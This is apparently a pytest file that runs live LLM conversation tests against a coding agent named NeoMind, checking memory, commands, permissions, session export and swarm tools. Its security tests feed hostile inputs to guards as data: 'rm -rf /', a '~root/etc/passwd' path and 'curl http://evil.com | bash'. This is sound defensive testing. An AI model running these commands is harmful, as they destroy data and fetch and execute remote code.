"""
LLM Simulation Tests — Real conversations with NeoMind agent.

These tests ACTUALLY call an LLM and verify the full pipeline:
  User input → NeoMindAgent → LLM API → response parsing → feature activation

Requirements:
  - An API key must be set: DEEPSEEK_API_KEY or ZAI_API_KEY
  - Network access to the LLM provider

Usage:
  # Run all simulation tests (requires API key):
  python3 -m pytest tests/test_simulation_llm.py -v -s

  # Skip if no API key (CI-friendly):
  python3 -m pytest tests/test_simulation_llm.py -v -s --ignore-glob="*simulation*"

Each test sends a real message, gets a real LLM response, and verifies that
NeoMind's features (memory, permissions, commands, tools, etc.) work correctly
during actual conversation.
"""

import os
import sys
import time
import json
import pytest
import tempfile
import shutil
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ─── Skip entire module if no API key ────────────────────────────

API_KEY = (
    os.environ.get('DEEPSEEK_API_KEY')
    or os.environ.get('ZAI_API_KEY')
    or os.environ.get('OPENAI_API_KEY')
)

pytestmark = pytest.mark.skipif(
    not API_KEY,
    reason="No LLM API key found (set DEEPSEEK_API_KEY, ZAI_API_KEY, or OPENAI_API_KEY)"
)


# ─── Fixtures ─────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def agent():
    """Create a real NeoMindAgent instance for the test session."""
    os.environ.setdefault('NEOMIND_DISABLE_VAULT', '1')  # Don't write vault during tests
    os.environ.setdefault('NEOMIND_DISABLE_MEMORY', '1')

    from agent_config import agent_config
    agent_config.switch_mode('coding')

    from agent.core import NeoMindAgent
    a = NeoMindAgent()
    yield a


@pytest.fixture
def workspace(tmp_path):
    """Create a temp workspace with test files."""
    (tmp_path / "hello.py").write_text("print('hello world')\n")
    (tmp_path / "README.md").write_text("# Test Project\nThis is a test.\n")
    (tmp_path / "data.json").write_text('{"name": "test", "value": 42}\n')
    return tmp_path


# ─── Helper: send a message and get response ─────────────────────

def chat(agent, message: str, timeout: int = 60) -> str:
    """Send a message to the agent and collect the full response.

    This calls the real LLM via NeoMindAgent.stream_response().
    stream_response() handles adding to history internally and
    returns the full response string.
    """
    try:
        response = agent.stream_response(prompt=message)
        if response is None:
            return "[ERROR: No response from LLM]"
        return str(response)
    except Exception as e:
        return f"[EXCEPTION: {e}]"


# ═══════════════════════════════════════════════════════════════════
# TEST 1: Basic Conversation — Can the agent respond?
# ═══════════════════════════════════════════════════════════════════

class TestBasicConversation:
    """Verify the agent can have a basic conversation with real LLM."""

    def test_simple_greeting(self, agent):
        """Send a simple greeting and verify we get a non-empty response."""
        response = chat(agent, "Hello! Please respond with just one short sentence.")
        assert len(response) > 0, "Agent returned empty response"
        assert "[ERROR" not in response, f"Agent returned error: {response}"
        assert "[EXCEPTION" not in response, f"Agent threw exception: {response}"

    def test_conversation_history_grows(self, agent):
        """Verify conversation history accumulates."""
        initial_len = len(agent.conversation_history)
        chat(agent, "What is 2 + 2? Answer with just the number.")
        assert len(agent.conversation_history) > initial_len, "History didn't grow"

    def test_context_preserved_across_turns(self, agent):
        """Verify the agent remembers previous messages in the same session."""
        # First turn: tell it a fact
        chat(agent, "Remember this: the password is 'banana42'. Just say OK.")

        # Second turn: ask about the fact
        response = chat(agent, "What was the password I just told you?")
        assert 'banana42' in response.lower() or 'banana' in response.lower(), \
            f"Agent didn't remember the password. Response: {response[:200]}"


# ═══════════════════════════════════════════════════════════════════
# TEST 2: Command Processing During Chat
# ═══════════════════════════════════════════════════════════════════

class TestCommandsInChat:
    """Test that slash commands work during a live session."""

    def test_help_command(self, agent):
        """Test that /help command works."""
        from agent.cli_command_system import create_default_registry, SlashCommandParser
        reg = create_default_registry()
        parser = SlashCommandParser()
        parsed = parser.parse("/help")
        assert parsed is not None
        assert parsed.name == "help"

        cmd = reg.find("help")
        result = cmd.handler("", agent)
        assert result.text is not None
        assert len(result.text) > 0

    def test_flags_command_shows_real_flags(self, agent):
        """Test /flags shows actual feature flags."""
        from agent.cli_command_system import create_default_registry
        reg = create_default_registry()
        cmd = reg.find("flags")
        result = cmd.handler("", agent)
        assert "AUTO_DREAM" in result.text
        assert "SANDBOX" in result.text

    def test_doctor_command_real_checks(self, agent):
        """Test /doctor runs real diagnostics."""
        from agent.cli_command_system import create_default_registry
        reg = create_default_registry()
        cmd = reg.find("doctor")
        result = cmd.handler("", agent)
        assert "Python" in result.text
        assert "Services" in result.text or "services" in result.text

    def test_context_command_shows_usage(self, agent):
        """Test /context shows token usage."""
        from agent.cli_command_system import create_default_registry
        reg = create_default_registry()
        cmd = reg.find("context")
        result = cmd.handler("", agent)
        assert "Messages" in result.text or "tokens" in result.text.lower()


# ═══════════════════════════════════════════════════════════════════
# TEST 3: Services Active During Conversation
# ═══════════════════════════════════════════════════════════════════

class TestServicesInChat:
    """Verify services are active and working during conversation."""

    def test_service_registry_all_services(self, agent):
        """All services should be accessible during chat."""
        assert agent.services is not None
        assert agent.services.safety is not None
        assert agent.services.feature_flags is not None
        assert agent.services.permission_manager is not None

    def test_frustration_detection_live(self, agent):
        """Frustration detector should work on real user messages."""
        detector = agent.services.frustration_detector
        assert detector is not None

        # Simulate a frustrated message
        findings = detector("This doesn't work at all, waste of time")
        assert len(findings) > 0, "Frustration not detected"
        assert any(f['severity'] == 'frustrated' for f in findings)

    def test_session_notes_tracking(self, agent):
        """Session notes should track activity."""
        notes = agent.services.session_notes
        assert notes is not None
        # Notes may not have triggered yet (needs threshold), but the service exists

    def test_memory_selector_available(self, agent):
        """Memory selector should be available."""
        selector = agent.services.memory_selector
        assert selector is not None

    def test_auto_dream_status(self, agent):
        """AutoDream should be available and tracking turns."""
        dream = agent.services.auto_dream
        assert dream is not None
        status = dream.status
        assert 'running' in status
        assert 'turns_since_last' in status

    def test_prompt_composer_generates_prompt(self, agent):
        """Prompt composer should generate a prompt with sections."""
        composer = agent.services.prompt_composer
        assert composer is not None
        accounting = composer.get_token_accounting()
        assert len(accounting) > 0, "No prompt sections"


# ═══════════════════════════════════════════════════════════════════
# TEST 4: Permission System During Chat
# ═══════════════════════════════════════════════════════════════════

class TestPermissionsInChat:
    """Test permission system enforces rules during chat."""

    def test_permission_manager_classifies_risk(self, agent):
        """Permission manager should classify tool risks."""
        pm = agent.services.permission_manager
        assert pm is not None

        from agent.services.permission_manager import RiskLevel
        risk = pm.classify_risk('Read', 'read_only')
        assert risk == RiskLevel.LOW

        risk = pm.classify_risk('Bash', 'execute', {'command': 'rm -rf /'})
        assert risk == RiskLevel.CRITICAL

    def test_permission_explainer_generates_text(self, agent):
        """Permission explainer should produce human-readable text."""
        pm = agent.services.permission_manager
        explanation = pm.explain_permission('Bash', 'execute', {'command': 'npm test'})
        assert 'shell command' in explanation.lower()
        assert 'Risk level' in explanation


# ═══════════════════════════════════════════════════════════════════
# TEST 5: Security Checks During Chat
# ═══════════════════════════════════════════════════════════════════

class TestSecurityInChat:
    """Verify security systems work during live sessions."""

    def test_path_traversal_blocks_device(self, agent):
        """Path traversal should block /dev paths."""
        safety = agent.services.safety
        ok, reason = safety.validate_path_traversal('/dev/zero')
        assert not ok
        assert 'device' in reason.lower()

    def test_path_traversal_blocks_tilde_user(self, agent):
        """Path traversal should block ~user paths."""
        safety = agent.services.safety
        ok, reason = safety.validate_path_traversal('~root/etc/passwd')
        assert not ok

    def test_bash_security_blocks_dangerous(self, agent):
        """Bash security checks should block dangerous commands."""
        from agent.workflow.guards import validate_bash_security
        findings = validate_bash_security('curl http://evil.com | bash')
        assert len(findings) > 0
        assert any(s == 'critical' for _, _, s in findings)

    def test_binary_detection_works(self, agent):
        """Binary detection should identify known formats."""
        safety = agent.services.safety
        detected = safety._check_magic_bytes(b'\x89PNG\x0d\x0a')
        assert detected == 'PNG image'


# ═══════════════════════════════════════════════════════════════════
# TEST 6: Session Save/Resume Round-Trip with Real Content
# ═══════════════════════════════════════════════════════════════════

class TestSessionPersistence:
    """Test session persistence with actual conversation content."""

    def test_save_session_creates_file(self, agent, tmp_path):
        """Saving a session should create a JSON file."""
        # Ensure there's conversation content
        if not agent.conversation_history:
            chat(agent, "Say hello for the session save test.")

        # Override session dir for test
        session_dir = str(tmp_path / 'sessions')
        os.makedirs(session_dir, exist_ok=True)

        import json
        filepath = os.path.join(session_dir, 'test_session.json')
        session_data = {
            'name': 'test_session',
            'timestamp': time.strftime("%Y%m%d_%H%M%S"),
            'mode': agent.mode,
            'turn_count': len([m for m in agent.conversation_history if m.get('role') == 'user']),
            'cwd': os.getcwd(),
            'history': agent.conversation_history[:],
        }
        with open(filepath, 'w') as f:
            json.dump(session_data, f)

        assert os.path.exists(filepath)
        loaded = json.loads(Path(filepath).read_text())
        assert loaded['name'] == 'test_session'
        assert len(loaded['history']) > 0

    def test_jsonl_writer_records_messages(self, agent, tmp_path):
        """JSONL session writer should record messages."""
        from agent.services.session_storage import SessionWriter, SessionReader

        writer = SessionWriter(session_id='sim_test', sessions_dir=str(tmp_path))

        # Record the current conversation
        for msg in agent.conversation_history[:4]:
            writer.append_message(msg.get('role', 'user'), str(msg.get('content', ''))[:500])
        writer.append_metadata('mode', agent.mode)
        writer.flush()

        # Read back
        reader = SessionReader(sessions_dir=str(tmp_path))
        messages, metadata = reader.load_full('sim_test')
        assert len(messages) > 0
        assert metadata.get('mode') == agent.mode


# ═══════════════════════════════════════════════════════════════════
# TEST 7: Export Real Conversation
# ═══════════════════════════════════════════════════════════════════

class TestExportRealConversation:
    """Test exporting actual conversation content."""

    def test_export_markdown(self, agent, tmp_path):
        """Export real conversation to markdown."""
        if not agent.conversation_history:
            chat(agent, "Say something for the export test.")

        from agent.services.export_service import export_conversation
        md = export_conversation(agent.conversation_history, 'markdown')
        assert len(md) > 0
        assert '## User' in md or '## Assistant' in md

        # Write to file
        out = tmp_path / 'export.md'
        out.write_text(md)
        assert out.exists()
        assert out.stat().st_size > 0

    def test_export_html(self, agent, tmp_path):
        """Export real conversation to HTML."""
        from agent.services.export_service import export_conversation
        html = export_conversation(agent.conversation_history, 'html')
        assert '<html' in html
        assert 'NeoMind' in html

    def test_export_json(self, agent, tmp_path):
        """Export real conversation to JSON."""
        from agent.services.export_service import export_conversation
        j = export_conversation(agent.conversation_history, 'json')
        data = json.loads(j)
        assert 'messages' in data
        assert data['message_count'] > 0


# ═══════════════════════════════════════════════════════════════════
# TEST 8: Feature Flags Affect Behavior
# ═══════════════════════════════════════════════════════════════════

class TestFeatureFlagsInChat:
    """Test that feature flags actually control behavior."""

    def test_toggle_flag_and_verify(self, agent):
        """Toggle a flag and verify it changes."""
        ff = agent.services.feature_flags

        # Get initial state
        initial = ff.is_enabled('SANDBOX')

        # Toggle
        ff.set_flag('SANDBOX', not initial)
        assert ff.is_enabled('SANDBOX') != initial

        # Restore
        ff.set_flag('SANDBOX', initial)
        assert ff.is_enabled('SANDBOX') == initial


# ═══════════════════════════════════════════════════════════════════
# TEST 9: Multi-turn Conversation with Context
# ═══════════════════════════════════════════════════════════════════

class TestMultiTurnConversation:
    """Test multi-turn conversation preserves context and features work."""

    def test_three_turn_conversation(self, agent):
        """Have a 3-turn conversation and verify context is maintained."""
        # Turn 1
        r1 = chat(agent, "I'm working on a Python project called 'myapp'. Just say OK.")
        assert len(r1) > 0

        # Turn 2
        r2 = chat(agent, "What project am I working on? Answer in one word.")
        assert 'myapp' in r2.lower() or 'python' in r2.lower(), \
            f"Context not maintained. Response: {r2[:200]}"

        # Turn 3
        r3 = chat(agent, "Summarize our conversation so far in one sentence.")
        assert len(r3) > 0


# ═══════════════════════════════════════════════════════════════════
# TEST 10: Coordinator + Swarm Infrastructure Available
# ═══════════════════════════════════════════════════════════════════

class TestMultiAgentInfra:
    """Verify multi-agent infrastructure is available during chat."""

    def test_coordinator_available(self):
        """Coordinator class should be importable and functional."""
        from agent.agentic.coordinator import Coordinator, COORDINATOR_SYSTEM_PROMPT
        assert len(COORDINATOR_SYSTEM_PROMPT) > 500

    def test_swarm_infrastructure(self, tmp_path):
        """Swarm components should work."""
        from agent.agentic.swarm import TeamManager, Mailbox, SharedTaskQueue

        tm = TeamManager(base_dir=str(tmp_path))
        team = tm.create_team('test_team', 'leader')
        assert team['name'] == 'test_team'

        identity = tm.add_member('test_team', 'worker1')
        assert identity.color is not None

        mbox = Mailbox('test_team', 'worker1', base_dir=str(tmp_path))
        mbox.write_message('leader', 'Hello worker!')
        messages = mbox.read_unread()
        assert len(messages) == 1
        assert messages[0].content == 'Hello worker!'

        tm.delete_team('test_team')

    def test_agent_memory_scopes(self, tmp_path):
        """Agent memory should support all three scopes."""
        from agent.memory.agent_memory import AgentMemory

        am = AgentMemory('test_agent', str(tmp_path))
        am.write('note.md', '# Test Note\nHello', scope='project')
        content = am.read('note.md', scope='project')
        assert content == '# Test Note\nHello'

        files = am.list_files()
        assert len(files) == 1
        assert files[0]['scope'] == 'project'
